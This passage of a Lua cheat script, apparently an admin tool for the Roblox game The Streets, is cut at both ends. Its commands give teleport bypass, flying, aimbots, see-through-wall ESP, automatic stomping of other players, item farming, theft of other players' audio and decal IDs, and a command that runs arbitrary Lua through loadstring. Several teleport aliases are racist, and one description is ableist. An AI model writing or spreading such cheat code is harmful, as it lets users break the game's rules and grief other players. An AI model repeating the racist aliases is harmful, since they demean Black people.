			Teleport(Player.Character.Head.CFrame)
		end
	end
end,"goto",{"to"},"Teleports you to the selected player")

AddCommand(function()
	TpBypass = not TpBypass
	GetChar():BreakJoints()
end,"tpbypass",{},"Turns on tp bypass")

AddCommand(function(Arguments)
	if Arguments[1] and tonumber(Arguments[1]) then 
		ClockTime = Arguments[1]
	end
end,"time",{},"Changes the time to the number you set")

AddCommand(function(Arguments)
	Blinking = not Blinking
	if Blinking then 
		if not Arguments[1] or not tonumber(Arguments[1]) then 
			BlinkSpeed = 2
		else 
			BlinkSpeed = Arguments[1]
		end
	end
	notif("Blinking","Has been set to "..tostring(Blinking),5,nil) 
end,"blink",{},"Another form of speed, Uses CFrame")

AddCommand(function(Arguments)
	if Arguments[1] then 
		if Arguments[1]:lower() == "shift" then
			BlinkMode = "Shift"
		elseif Arguments[1]:lower() == "none" then 
			BlinkMode = "None" -- giving people the illusion of free choice is my motto!
		end
		updateSettings()
	end 
end,"blinkmode",{},"Changes Blinkmode")

AddCommand(function(Arguments)
	if readfile and writefile then
		if Arguments[1] then
			if Arguments[1]:lower() == "default" then
				Config = "CyrusStreetsAdminSettings"
				runsettings()
			elseif pcall(readfile,Arguments[1]) then
				Config = Arguments[1]
				runsettings(Arguments[1])
			else
				Config = Arguments[1]
				savesettings()
				runsettings()
			end 
		end 
	end 
end,"config",{},"Changes Config") 

AddCommand(function(Arguments)
	if Arguments[1] then
		Arguments[1] = Arguments[1]:lower()
		if Arguments[1] == "banland" then 
			TeleportService:Teleport(4669040)
		elseif Arguments[1] == "normalstreets" then 
			TeleportService:Teleport(455366377)
		elseif Arguments[1] == "uzi" then 
			GrabThing("Uzi",GetChar().Head.CFrame)
		elseif Arguments[1] == "machete" then 
			GrabThing("Machete",GetChar().Head.CFrame)
		elseif Arguments[1] == "spray" then 
			GrabThing("Spray",GetChar().Head.CFrame)
		elseif Arguments[1] == "sawed" or Arguments[1] == "sawedoff" then 
			GrabThing("SawedOff",GetChar().Head.CFrame)
		elseif Arguments[1] == "pipe" then 
			GrabThing("Pipe",GetChar().Head.CFrame)
		elseif Arguments[1] == "glock" then 
			GrabThing("Glock",GetChar().Head.CFrame)
		elseif PartTable and Arguments[1] == "sand" or Arguments[1] == "sandbox" then
			Teleport(CFrame.new(-178.60614013672,3.2000000476837,-117.21733093262))
		elseif PartTable and Arguments[1] == "prison" or Arguments[1] == "jail" or Arguments[1] == "whereblacksgoaftertheyattempttorobsaidbank" then 
			Teleport(CFrame.new(-978.74725341797,3.199854850769,-78.541763305664))
		elseif PartTable and Arguments[1] == "gas" or Arguments[1] == "gasstation" then 
			Teleport(CFrame.new(99.135276794434,18.599975585938,-73.462348937988))
		elseif PartTable and Arguments[1] == "court" or Arguments[1] == "basketballcourt" then 
			Teleport(CFrame.new( -191.56864929199,3,223.43171691895))
		elseif PartTable and Arguments[1] == "beach" then 
			Teleport(CFrame.new(-663.97521972656,1.8657279014587,-369.04748535156))
		elseif PartTable and Arguments[1] == "bank" or Arguments[1] == "whatblacksrob" then
			Teleport(CFrame.new(-270.44195556641,4.8757019042969,133.12774658203))
		end
	end
end,"tpto",{"tp"},"Teleports to places [banland/normalstreets/uzi/machete/spray/sawed/sawedoff/pipe/sand/prison/gas/court/beach/bank]")

local FlySpeed = 10
local FirstFly = true  
local function fly(SPEED) -- CREDITS TO INFINITE YIELD FOR THIS FLY METHOD (I'M PLANNING TO MAKE MY OWN SOON)
FlySpeed = SPEED or 10
	local T = GetChar():FindFirstChild'HumanoidRootPart' or GetChar():FindFirstChild'Torso'
	if not AirWalkOn then
		CheckCommand("airwalk") -- decided to use airwalk since it works the best
	end 
	local CONTROL = {F = 0, B = 0, L = 0, R = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
	local function fly()
		flying = true
		local BG = Instance.new('BodyGyro', T)
		local BV = Instance.new('BodyVelocity', T)
		BG.P = 9e4
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0.1, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		spawn(function()
		repeat wait()
		if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
		SPEED = 50
		elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
		SPEED = 0
		end
		if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
		BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
		lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
		elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
		BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
		else
		BV.velocity = Vector3.new(0, 0.1, 0)
		end
		BG.cframe = workspace.CurrentCamera.CoordinateFrame
				until not flying
				CONTROL = {F = 0, B = 0, L = 0, R = 0}
				lCONTROL = {F = 0, B = 0, L = 0, R = 0}
				SPEED = 0
				BG:destroy()
				BV:destroy()
				LP.Character:FindFirstChildOfClass'Humanoid'.PlatformStand = false
				if AirWalkOn then
					CheckCommand("airwalk")
				end 
			end)
		end
	Mouse.KeyDown:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = FlySpeed
		elseif KEY:lower() == 's' then
			CONTROL.B = -FlySpeed
		elseif KEY:lower() == 'a' then
			CONTROL.L = -FlySpeed 
		elseif KEY:lower() == 'd' then 
			CONTROL.R = FlySpeed
		end
	end)
	Mouse.KeyUp:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		end
	end)
	fly()
	if FirstFly then
		flying = false 
		wait(0.5)
		fly()
		FirstFly = false
	end
end

AddCommand(function(Arguments)
	if not flying then
		fly(Arguments[1] and tonumber(Arguments[1]) or 10)
	else 
		flying = false 
	end
end,"fly",{"f"},"Allows you to be like a bird")

AddCommand(function(Arguments)
	if Arguments[1] then 
		if Arguments[1]:lower()	== "normal" then 
			workspace.CurrentCamera.FieldOfView = OldFov
		elseif tonumber(Arguments[1]) then 
			workspace.CurrentCamera.FieldOfView = Arguments[1]
		end 
	end 
end,"fov",{},"Changes Field Of View")

AddCommand(function(Arguments)
	if Arguments[1] then 
		if string.lower(Arguments[1]) == "ws" or string.lower(Arguments[1]) == "speed" then 
			GetChar():FindFirstChildWhichIsA'Humanoid'.WalkSpeed = Arguments[2]
			Normalwalk = true
			SpawnWS = Arguments[2] or NormalWS
		elseif string.lower(Arguments[1]) == "jp" or string.lower(Arguments[1]) == "jumppower" then 
			GetChar():FindFirstChildWhichIsA'Humanoid'.JumpPower = Arguments[2]
            SpawnJP = Arguments[2] or NormalJP
        elseif string.lower(Arguments[1]) == "hh" or string.lower(Arguments[1]) == "hipheight" then
         GetChar():FindFirstChildWhichIsA'Humanoid'.HipHeight = Arguments[2] 
			SpawnHH = Arguments[2] or NormalHH
		end
	end
end,"loop",{},"[Ws/Speed/Jp/JumpPower/HH/HipHeight/]")

AddCommand(function(Arguments)
	if Arguments[1] then
	local v = PlrFinder(Arguments[1])
		if v then 
			if not Arguments[2] then
				notif(v.Name,"Is on "..v.OsPlatform.." and is "..v.AccountAge.." days old",5,nil)
	      	elseif Arguments[2] and Arguments[2]:lower() == "os" or Arguments[2]:lower() == "operatingsystem" then 
				notif(v.Name,"is on "..v.OsPlatform,5,nil)
	      	elseif Arguments[2] and Arguments[2]:lower() == "age" or Arguments[2]:lower() == "accountage" or Arguments[2]:lower() == "accage" then 
				notif(v.Name,"has the account age of "..v.AccountAge,5,nil)
			end
		end
	else
		notif(LP.Name,"you are on "..LP.OsPlatform.."(duh) and your Account Age is "..LP.AccountAge,5,nil)
	end
end,"playerinfo",{"info"},"PlayerInfo/Info [Player] [Os/OperatingSystem/AccAge/Age/Accountage/none]")

local AntiAim = false 
AddCommand(function()
	if AntiAim then 
		local Tracks = GetChar().Humanoid:GetPlayingAnimationTracks()
		for i = 1,#Tracks do 
			if string.find(Tracks[i].Animation.AnimationId,"215384594") then 
				Tracks[i]:Stop()
			end
		end
	else
		local Anim = Instance.new'Animation'
		Anim.AnimationId = "rbxassetid://215384594"
		GetChar().Humanoid:LoadAnimation(Anim):play(5,45,250)
	end
	AntiAim = not AntiAim
end,"antiaim",{},"breaks shitty aimbots lol")

AddCommand(function()
if not PartTable then notif("Sorry,","This command only works on streets.",5,nil) return end
local PartFound = GetChar():FindFirstChild'HumanoidRootPart' or GetChar():FindFirstChild'Torso'
math.randomseed(os.time())
	if workspace:FindFirstChild'Cars' then 
		local Car = workspace.Cars:GetDescendants()
		for i = 1,#Car do
			local i = math.random(1,#Car)
			if Car[i]:IsA'VehicleSeat' and Car[i].Name == "Drive" and not Car[i].Occupant then 
				PartFound.CFrame = Car[i].CFrame
			end
		end
	else 
		notif("Command: BringCar","no cars to bring",nil)
	end 
end,"bringcar",{},"Brings a car (Streets only)")

AddCommand(function(Arguments)
	if Arguments[1] and #Arguments[1] == 1 and Arguments[2] and Keys then
		for Index,Key in pairs(Keys) do
		if Key:match("[%a%d]+$") == Arguments[1]:lower() then
				table.remove(Keys,Index)
			end
		end
		local Hotkey = table.remove(Arguments, 1)
		Keys[#Keys + 1] = table.concat(Arguments, " ").."||"..Hotkey
		if writefile and readfile then 
			updateSettings()
		end
	end
end,"hotkey",{"key"},"Hotkeys a command to a key")

AddCommand(function()
if not PartTable then notif("Sorry,","This command only works on streets.",5,nil) return end 
if TpBypass then notif("Due to snakes code","you can not use burgers/drinks with the tpbypass") return end
	if GrabThing("Burger",GetChar().Head.CFrame) then
		local Hamborger = LP.Backpack:FindFirstChild'Burger'
		if Hamborger then 
			Hamborger.Parent = GetChar()
			Hamborger:Activate() -- CHEEMS
			repeat RunService.Heartbeat:Wait() until Hamborger.Parent ~= LP.Character
		end
	end
	if GrabThing("Drink",GetChar().Head.CFrame) then
		local Drink = LP.Backpack:FindFirstChild'Drink'
		if Drink then 
			Drink.Parent = GetChar()
			Drink:Activate()
		end 
	end
end,"heal",{"h"},"Heals you")

AddCommand(function(Arguments)
	if not PartTable then notif("Sorry,","This command only works on streets.",5,nil) return end 
	HealBot = not HealBot 
	if Arguments[1] and Arguments[2] and tonumber(Arguments[2]) and Arguments[1] == "health" then 
		HealBotHealth = tonumber(Arguments[2])
	end 
	notif("HealBot","Has been set to "..tostring(HealBot),5,nil) 
end,"healbot",{},"Turns on auto healing at a set health (Defaults at 25 hp")

AddCommand(function()
	if not PartTable then notif("Sorry,","This command only works on streets.",5,nil) return end 
	if not GetChar():FindFirstChildOfClass'Tool' then notif("Tool needed","Hold a gun",5,nil) return end 
	GrabThing("Ammo",GetChar().Head.CFrame)
end,"reload",{"r"},"Gives your current gun ammo")

AddCommand(function()
	DoubleJumpEnabled = not DoubleJumpEnabled
	notif("Command: DoubleJump","has been set to "..tostring(DoubleJumpEnabled),5,"rbxassetid://1281284684")
end,"doublejump",{},"Allows you to jump infitely")

AddCommand(function(Arguments)
	if Arguments[1] then
		for Index,Key in pairs(Keys) do
		if Key:match("[%a%d]+$") == Arguments[1]:lower() then
				table.remove(Keys,Index)
			end
		end
	end
end,"removekey",{"rkey"},"Removes a hotkey to a command")

AddCommand(function()
	LP:Kick'SHUT'
end,"sex",{},"Added sex now shut up about it in cyadmin suggestions")

AddCommand(function()
	Keys = {}
	ClickTpKey = ""
	updateSettings()
end,"removeallhotkeys",{"removeallkeys"},"Removes all hotkeys")

AddCommand(function(Arguments)
	if Arguments[1] then
		Arguments[1] = Arguments[1]:lower()
		if Arguments[1] == "outline" then 
			Cframe.BackgroundColor3 = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
		elseif Arguments[1] == "text" then 
			CText.BackgroundColor3 = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
		elseif Arguments[1] == "background" then 
			CmdFrame.BackgroundColor3 = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
		elseif Arguments[1] == "damageindicator" then 
			DmgIndicator.TextColor3 = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
		elseif Arguments[1] == "cmds" then 
			local Child = CmdFrame:GetChildren() 
			for i = 1,#Child do 
				if Child[i]:IsA'TextLabel' then 
					Child[i].BackgroundColor3 = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
				end
			end
		elseif Arguments[1] == "bullet" then
			BulletColour = ColorSequence.new(Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0))
		elseif Arguments[1] == "values" then 
			DrawingT.Color = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
		elseif Arguments[1] == "itemesp" then
			ItemEspColour = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
		elseif Arguments[1] == "esp" then 
			EspColour = Color3.fromRGB(Arguments[2] or 0,Arguments[3] or 0,Arguments[4] or 0)
		else
			notif("Command: Colour","Colour: [BackGround/Text/Outline/cmds/damageindicator/bullet/values/itemesp/esp] [rgb]",5,"rbxassetid://1281284684")
		end
	end
end,"colour",{"color"},"Changes elements colours Colour [BackGround/Text/Outline/cmds/damageindicator/bullet/values/itemesp/esp]")

AddCommand(function(Arguments)
	if Arguments[1] then
		ClickTpKey = string.sub(Arguments[1],1,1)
		if readfile and writefile then 
			updateSettings()
		end
	end
end,"clicktp",{"ctp"},"Allows you to teleport around the map with a Key")

local ViewPlayerConnection,ViewPlayerConnection2;
AddCommand(function(Arguments)
	if Arguments[1] then 
	local Plr = PlrFinder(Arguments[1]) 
		if Plr and Plr.Character then
			if ViewPlayerConnection then ViewPlayerConnection:Disconnect() ViewPlayerConnection = nil ViewPlayerConnection2:Disconnect() ViewPlayerConnection2 = nil end 
			workspace.CurrentCamera.CameraSubject = Plr.Character
			if Arguments[2] and Arguments[2] == "loop" then
				ViewPlayerConnection = Plr.CharacterAdded:Connect(function(C)
					workspace.CurrentCamera.CameraSubject = C
				end)
				LP.CharacterAdded:Connect(function(C)
					if Plr.Character then
						workspace.CurrentCamera.CameraSubject = Plr.Character -- I don't know if this does anything I coded it at 7am but I remember someone saying view plr loop doesn't work when you respawn so
					end
				end)
			end
		end
	end
end,"view",{},"Allows you to look through a players vision")

AddCommand(function()
	if ViewPlayerConnection and ViewPlayerConnection2 then ViewPlayerConnection:Disconnect() ViewPlayerConnection2:Disconnect() ViewPlayerConnection = nil ViewPlayerConnection2 = nil end 
	workspace.CurrentCamera.CameraSubject = GetChar()
end,"unview",{},"Brings you back to your normal vision")

local HR;
AddCommand(function(Arguments)
if not GetChar():FindFirstChild'HumanoidRootPart' then notif("Sorry","this can be only used without tpbypass on",5,nil) end
	if HR then
		local CFramex = HR.CFrame
		HR:Destroy()
		HR = nil
		wait(0.5)
		Teleport(CFramex)
		workspace.CurrentCamera.CameraSubject = GetChar()
	else 
		local old = GetChar().HumanoidRootPart.CFrame
		HR = GetChar().HumanoidRootPart:Clone()
		HR.Parent = GetChar()
		workspace.CurrentCamera.CameraSubject = GetChar().Head
		HR.CFrame = CFrame.new(10000,0,10000)
		HR.CFrame = old
	end
end,"fblink",{},"Allows you to \"blink\" around the map")

AddCommand(function(Arguments)
	if not Freecam then
		Freecam = true 
		FreeCam(Arguments[1])
	else
		Freecam = false
	end 
end,"freecam",{},"Allows you to \"free\" view the map")

AddCommand(function(Arguments)
	if Arguments[1] then 
        if Arguments[1]:lower() == "cash" then 
          farm("Cash")
        elseif Arguments[1]:lower() == "shotty" then 
          farm("Shotty")
        elseif Arguments[1]:lower() == "uzi" then 
          farm("Uzi")
        elseif Arguments[1]:lower() == "katana" then 
          farm("Katana")
        elseif Arguments[1]:lower() == "sawed off" or Arguments[1]:lower() == "sawed" then 
          farm("Sawed Off")
        elseif Arguments[1]:lower() == "all" then 
		  farm("All")
		elseif Arguments[1]:lower() == "auto" then 
			if not AutoFarm then
				farm("Cash")
			end
			local WChild = workspace:GetDescendants() 
			for i = 1,#WChild do
				if WChild[i]:IsA'Seat' then 
					WChild[i]:Destroy()
				end
			end
			AutoFarm = not AutoFarm
      	end
    end
end,"farm",{},"Grabs you stuff around the map (farm [shotty/cash/uzi/katana/sawed/all/auto] - auto is for cash")

AddCommand(function()
	ItemEsp = not ItemEsp
	if ItemEsp then 
		local ChildrenInMyAttic = workspace:GetChildren()
		for i = 1,#ChildrenInMyAttic do 
			if ChildrenInMyAttic[i].Name == "RandomSpawner" then 
				addBillBoardGui(ChildrenInMyAttic[i])
			end
		end
	else 
		local WChild = workspace:GetChildren()
		for i = 1,#WChild do
		local BBGui = WChild[i]:FindFirstChildOfClass'BillboardGui'
			if WChild[i].Name == "RandomSpawner" and BBGui then 
				BBGui:Destroy()
			end
		end
	end 
end,"itemesp",{},"Allows you to see where all the spawners are on the map through walls")

AddCommand(function(Arguments)
	if Arguments[1] then
		if Arguments[1]:lower() == "all" then notif("STOP IT","NO. JUST NO.",10,nil) return end 
		local Player = PlrFinder(Arguments[1]) 
		if Player ~= LP and Player and tostring(AimlockTarget) ~= tostring(Player) then
			CheckCommand("esp "..Player.Name)
			AimLock = true 
			AimlockTarget = Player.Character
			local Connection; -- Localized so that it is only accessible in this function (Otherwise it would be over-wrote every time this command was called and would never be disconnected)
			Connection = Player.CharacterAdded:Connect(function(C)
				if tostring(C) == tostring(AimlockTarget) then 
					AimlockTarget = C
				else 
					Connection:Disconnect()
				end 
			end)
			notif("AimlockTarget has been set to",AimlockTarget.Name,5,nil)
		end
	else
		AimLock = not AimLock
		notif("Aimlock","has been set to "..tostring(AimLock),5,"rbxassetid://1281284684")
	end
end,"aimlock",{"aim"},"Shoots your gun that is titled 75 degrees at the selected person (Aimlock [Player/nil/loop] - if nil click players to set the aimlock target to them (loop makes it so when they respawn it still locks on)")

local WhiteListedParts = {
	['head'] = "Head";
	['torso'] = "Torso";
	['humanoidrootpart'] = "HumanoidRootPart";
	['prediction'] = "Prediction";
}

AddCommand(function(Arguments)
	if Arguments[1] then
		if WhiteListedParts[Arguments[1]:lower()] then
			TargetPart = WhiteListedParts[Arguments[1]:lower()]
			updateSettings()
			notif("AimTarget","has been set to "..TargetPart,5,"rbxassetid://1281284684")
		end
	end
end,"aimtarget",{},"Allows you to pick between a part for aimlock to target/prediction")

AddCommand(function(Arguments)
	if Arguments[1] and tonumber(Arguments[1]) then 
		AimbotVelocity = Arguments[1]
		updateSettings()
	end 
end,"aimvelocity",{},"Changes your aimbot prediction velocity default: 5")

AddCommand(function(Arguments)
	if Arguments[1] then 
		if Arguments[1] == "all" then 
			local Players_ = Players:GetPlayers() 
			for i = 1,#Players_ do 
				if Players_[i] ~= LP and not table.find(EspTable,Players_[i].UserId) then
					table.insert(EspTable,Players_[i].UserId)
					if not UseDraw or Arguments[2] and Arguments[2]:lower() == "legacy" then 
						espPlayer(Players_[i],"Legacy")
					else 
						espPlayer(Players_[i])
					end
				end
			end
		else 
			local Player = PlrFinder(Arguments[1])
			if not Player then return end 
			if Player ~= LP and not table.find(EspTable,Player.UserId) then
				table.insert(EspTable,Player.UserId)
				if not UseDraw or Arguments[2] and Arguments[2]:lower() == "legacy" then 
					espPlayer(Player,"Legacy")
				else
					espPlayer(Player)
				end
			end
		end
	end
end,"esp",{},"allows you to see the player through walls (Esp [plr] legacy for the old esp (will default if you do NOT have drawing api)")

AddCommand(function(Arguments)
	if Arguments[1] and Arguments[2] then 
		if Arguments[1]:lower() == "line" then 
			if Arguments[2]:lower() == "thickness" and Arguments[3] then 
				DrawTable['Thickness'] = tonumber(Arguments[3])
			elseif Arguments[2]:lower() == "transparency" and Arguments[3] then 
				DrawTable['Transparency'] = tonumber(Arguments[3])
			elseif Arguments[2]:lower() == "visible" then 
				DrawTable['Visible'] = not DrawTable['Visible'] 
			end 
		end
	end 
end,"espsettings",{},"Changes Drawing API esp settings")

AddCommand(function(Arguments)
	if Arguments[1] then 
	local Player = PlrFinder(Arguments[1])
	if not Player then return end
	local A = workspace:GetDescendants()
	table.remove(EspTable,Player.UserId)
		for i = 1,#A do
			if string.sub(A[i].Name, 1, 5) == "[ESP]" and string.sub(A[i].Name, 6) == Player.Name then
				A[i]:Destroy()
			end
		end
		Unesp(Player)
	else
		local A = workspace:GetDescendants()
		EspTable = {}
		for i = 1,#A do
			if string.sub(A[i].Name, 1, 5) == "[ESP]" then
				A[i]:Destroy()
			end
		end
		local P = Players:GetPlayers()
		for i = 1,#P do 
			Unesp(P[i])
		end 
	end
end,"unesp",{},"Removes the esp on the player")

AddCommand(function()
	wait(0.5)
	ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Made by NotCyrusAtAll | Join the cord at nXcZH36","All")
end,"advertise",{},"Advertises my discord lol")

AddCommand(function()
	if GetChar():FindFirstChildOfClass'Tool' then 
		GetChar():FindFirstChildOfClass'Tool'.Parent = workspace.Terrain
	end
end,"droptool",{"drop"},"Drops your current tool")

AddCommand(function(Arguments)
	if Arguments[1] then 
		loadstring(table.concat(Arguments," "))()
	end 
end,"luacode",{"lua"},"Allows you to execute the Lua code you input")

AddCommand(function()
	AutoStomp = not AutoStomp
	notif("Command: AutoStomp","AutoStomp has been set to "..tostring(AutoStomp),5,"rbxassetid://1281284684")
end,"autostomp",{},"Turns On/Off AutoStomp")

AddCommand(function(Arguments)
	if Arguments[1] and Arguments[1]:lower() == "remove" then 
		if Arguments[2] then
			local Player = PlrFinder(Arguments[2])
			if Player and Player ~= LP then
				for i,v in pairs(DontStompWhitelisted) do if Player.UserId == v then table.remove(DontStompWhitelisted,i) end end
			end
		else 
			DontStompWhitelisted = {}
		end
	else 
		local Player = PlrFinder(Arguments[1])
		if Player and Player ~= LP then 
			table.insert(DontStompWhitelisted,Player.UserId)
		end 
	end
end,"autostompwhitelist",{},"Whitelists to autostomp so that it doesn't stomp them")

AddCommand(function(Arguments)
	if Arguments[1] and Arguments[1] == "legacy" then 
		if GetChar():FindFirstChild'Right Arm' then 
			GetChar()['Right Arm']:Destroy()
		end
	else 
		local ToolTable,CurrentTools = {},LP.Backpack:GetChildren() 
		for i = 1,#CurrentTools do
			local Tool = CurrentTools[i]
			if Tool:IsA'Tool' then
				ToolTable[#ToolTable + 1] = Tool 
			end
		end 
		GetChar().ChildAdded:Connect(function(T)
		local TempTable;
			if T:IsA'Tool' then 
				if table.find(ToolTable,T) then return end
				wait()
				T.Parent = LP.Backpack 
				table.insert(ToolTable,T)
			end
		end)	
	end 
end,"antikill",{},"Turns on Anti FE kill for your current life")

AddCommand(function(Arguments)
	if Arguments[1] then 
		local Player = PlrFinder(Arguments[1])
		if Player and Player.Character then 
			local PlayerChild = Player.Character:GetDescendants() 
			for i = 1,#PlayerChild do
				local v = PlayerChild[i]
				if v:IsA'Sound' and v.Name == "SoundX" or v.Name == "son" then
					notif("Stole the Audio","From "..Player.Name.." check your exploits workspace folder",5,nil)
					writefile("AudioLog From "..Player.Name.." "..math.random(1,99)..".txt","Stolen ID: "..v.SoundId:match"%d+".." From: "..Player.Name)
				end
			end
		end
	end 
end,"steal",{},"Steals a persons audio")

AddCommand(function(Arguments)
	if Arguments[1] then 
	local Player = PlrFinder(Arguments[1])
		if Player then 
			local FindDecal = workspace:FindFirstChild(Player.Name.."Spray")
			if FindDecal and FindDecal:FindFirstChildOfClass'Decal' then 
				writefile("DecalLog From "..Player.Name.." "..math.random(1,99)..".txt","Stolen Decal: "..tostring(FindDecal.Decal.Texture:match"%d+").." From: "..Player.Name)
				notif("Stole the Decal","From "..Player.Name.." check your exploits workspace folder",5,nil)
			end
		end
	end
end,"decalsteal",{},"Steals a persons decal")

AddCommand(function()
	AntiAfk = not AntiAfk
	notif("Command: AntiAfk","has been set to "..tostring(AntiAfk),5,"rbxassetid://1281284684")
end,"antiafk",{},"Stops you from being kicked from \"AFK\"")

AddCommand(function(Arguments)
	CamLocking = not CamLocking
	if Arguments[1] then
		local Player = PlrFinder(Arguments[1])
		if Player then 
			CamlockPlayer = Player
		end
	end 
end,"camlock",{"lockcam","cl"},"Different type of aimbot (Uses camera instead of the remote)")

local RainbowTable1,RainbowTable2;
AddCommand(function()
	if game.PlaceId ~= 455366377 then notif("Wont work","you need to be on streets",5,nil) return end 
	RainbowHats = not RainbowHats
	RainbowTable1,RainbowTable2 = LP.PlayerGui.HUD.Clan.Group.cs:GetChildren(),{}
	local a = LP.PlayerGui.HUD.Clan.Group.Reps:GetChildren()
	for i = 1,#a do 
		if a[i]:IsA'TextButton' then 
			RainbowTable2[#RainbowTable2 + 1] = a[i]
		end 
	end 
end,"rainbowhats",{},"complete autism lol")

AddCommand(function(Arguments)
	if game.PlaceId == 455366377 then notif("Wont work","Prison Only",5,nil) return end
	FeLoop = not FeLoop
	if FeLoop and not CanUseFeloop then
		wait(0.5)
		ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("To use Feloop, Tell me what 2+2 equals - Cy","All")
		local Chat = LP.Chatted:Wait()
		if Chat:lower() ~= "fish" then LP:Kick('That answer is wrong.') else CanUseFeloop = true end
	end
	if Arguments[1] then
		FeLoop = true 
		local Player = PlrFinder(Arguments[1])
		if Player then 
			GetChar():BreakJoints()
			LoopPlayer = Player 
		end
	else
		LoopPlayer = nil
	end
end,"feloop",{},"First you were a skid, Now you're annoying with a simple use of this command!","[Player]")

AddCommand(function(Arguments)
	if Arguments[1] then 
		if Arguments[1]:lower() == "leftclick" then 
			AimlockMode = "LeftClick"
			updateSettings()
		elseif Arguments[1]:lower() == "rightclick" then 
			AimlockMode = "RightClick"
			updateSettings()
		elseif Arguments[1]:lower() == "nomouse" then 
			AimlockMode = "NoMouse" 
			updateSettings()
		else
			notif("Not a mode","Either type leftclick,rightclick,nomouse")
		end
	end
end,"aimmode",{"aimlockmode"},"Sets aimmode [LeftClick/RightClick]")

AddCommand(function()
local Table = {}
	for i = 1,10 do 
		local Server = HttpService:JSONDecode(game:HttpGet("https://www.roblox.com/games/getgameinstancesjson?placeId="..game.PlaceId.."&startindex="..i)) -- OMG IP LOGGER IT DOES AN HTTP REQUEST - half of people on the streets lol
		for i = 1,#Server.Collection do 
			Table[Server.Collection[i].Ping] = Server.Collection[i].Guid
		end
	end
	for i,v in pairs(Table) do
		if v ~= game.JobId then 
			TeleportService:TeleportToPlaceInstance(game.PlaceId,v)
			break
		end 
	end 
end,"serverhop",{},"Server hopping capabilities")


local function Temp()
local Table = {} 
	for i,v in pairs(CmdFrame:GetChildren()) do
		table.insert(Table,v.Text)
	end
	return Table 
end 

local WhitelistedOs = {
	['durango'] = "Xbox";
	['win32'] = "Windows";
	['ios'] = "Apple";
	['android'] = "Superior Android";
	['osx'] = "Mac (GROSS)";
	['windows_universal'] = "Windows 10 roblox"
}
UserInput.WindowFocusReleased:Connect(function()
    RobloxInForeground = false 
    UserInput.WindowFocused:Wait()
    RobloxInForeground = true 
end)

local Debounce = false -- this code gets uglier every day holy fuck I'm gonna have to re-write it again soon lmao
local function Stepped()
	if GodMode or FeLoop then 
		if LP.Character:FindFirstChild'Right Leg' then 
			LP.Character['Right Leg']:Destroy()
		end
	end
local PartFound = LP.Character:FindFirstChild'HumanoidRootPart' or LP.Character:FindFirstChild'Torso'
	if Noclipping then 
		local CDescendant = LP.Character:GetDescendants() 
		for i = 1,#CDescendant do 
			if CDescendant[i]:IsA'Part' then 
				CDescendant[i].CanCollide = false
			end
		end
	end
	if flying and LP.Character:FindFirstChild'Humanoid' and not Debounce then
		Debounce = true
		LP.Character.Humanoid:ChangeState(3)
		wait(0.2)
		Debounce = false
	end 
	if RainbowHats and LP.Backpack:FindFirstChild'Stank' then 
		LP.Backpack.Stank:FireServer("rep",RainbowTable2[math.random(1,#RainbowTable2)])
		LP.Backpack.Stank:FireServer("color",RainbowTable1[math.random(1,#RainbowTable1)])
	end
	if TpBypass and LP.Character:FindFirstChild'RealHumanoidRootPart' then 
		LP.Character:FindFirstChild'RealHumanoidRootPart':Destroy() 
	end 
	if ClockTime then 
		Lighting.ClockTime = ClockTime 
	end
	if FeLoop and CanUseFeloop then
		local BChild = LP.Backpack:GetChildren()
        for i = 1,#BChild do 
            BChild[i].Parent = LP.Character
            if game.PlaceId == 455366377 then 
                repeat wait() until not LP.Character:FindFirstChildOfClass'Tool'
            end
		end
		if PartFound and LoopPlayer and LoopPlayer.Character and LoopPlayer.Character:FindFirstChild'Torso' then 
			PartFound.CFrame = LoopPlayer.Character.Torso.CFrame
		end 
	end
	if AutoStomp then
		local Players = Players:GetPlayers()
		for i = 1,#Players do
			if Players[i] ~= LP and Players[i].Character and Players[i].Character:FindFirstChild'Head' and Players[i].Character:FindFirstChild'Torso' and not Players[i]:IsFriendsWith(LP.UserId) then
